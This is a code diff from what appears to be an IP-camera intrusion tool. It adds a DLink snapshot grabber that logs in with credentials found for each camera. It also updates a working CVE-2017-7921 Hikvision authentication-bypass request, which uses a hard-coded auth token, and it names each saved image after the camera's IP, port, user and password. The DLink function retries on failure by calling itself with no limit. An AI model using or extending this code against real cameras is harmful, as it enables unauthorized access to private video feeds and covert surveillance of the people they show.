@@ -31,13 +31,16 @@ def save_snapshot(args) -> None:
         # cve-2017-7921
         if camera_info[-1] == 'cve-2017-7921':
             snapshot_cve_2017_7921(camera_info[0], camera_info[1], snapshot_path)
+        # user & passwd
         elif camera_info[2]:
-            # user & passwd (Dahua / Hikvision)
+            # Dahua / Hikvision
             if camera_info[4] == 'Dahua' or camera_info[4] == 'Hikvision':
                 snapshot_rtsp(*camera_info[:4], snapshot_path)
-            # multiplay
+            # Hikvision multiplay / HB-Teck
             if camera_info[4] == 'HB-Tech/Hikvision':
                 snapshot_rtsp_hb(*camera_info[:4], snapshot_path)
+            if camera_info[4] == 'DLink':
+                snapshot_dlink(*camera_info[:4], snapshot_path)
     except Exception as e:
         pass
 
@@ -74,8 +77,17 @@ def snapshot_rtsp_hb(ip, port, user, passwd, sv_path):
                 break
 
 
+def snapshot_dlink(ip, port, user, passwd, sv_path):
+    r = requests.get(f"http://{ip}:{port}/dms?nowprofileid=1", auth=(user, passwd), timeout=3)
+    if r.status_code == 200:
+        name = f"{ip}:{port}-{user}-{passwd}.jpg"
+        with open(os.path.join(sv_path, name), 'wb') as f:
+            f.write(r.content)
+    else: snapshot_dlink(ip, port, user, passwd, sv_path)
+    
+
 def snapshot_cve_2017_7921(ip, port, sv_path):
-    r = requests.get(f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
+    r = requests.get(f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
     if r.status_code == 200:
         name = f"{ip}:{port}-cve_2017_7921.jpg"
         with open(os.path.join(sv_path, name), 'wb') as f:
